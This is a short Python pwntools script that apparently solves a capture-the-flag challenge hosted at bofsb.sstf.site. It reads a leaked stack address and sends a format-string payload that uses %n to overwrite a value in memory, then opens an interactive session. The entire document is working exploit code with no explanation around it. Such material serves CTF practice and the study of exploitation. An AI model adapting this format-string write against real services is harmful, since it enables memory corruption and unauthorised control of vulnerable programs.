from pwn import *

r = remote("bofsb.sstf.site", 1337)

r.sendlineafter(" > ", "1")		#1 or 2, whatever
r.recvuntil("code: ")

v5_addr = int(r.readline().strip(), 16)

payload = p32(v5_addr - 4) + "%29x%n"		#33 - 4 = 29
payload = payload.ljust(0x40, ":")
payload += p32(v5_addr)
r.sendlineafter("name: ", payload)
r.interactive()
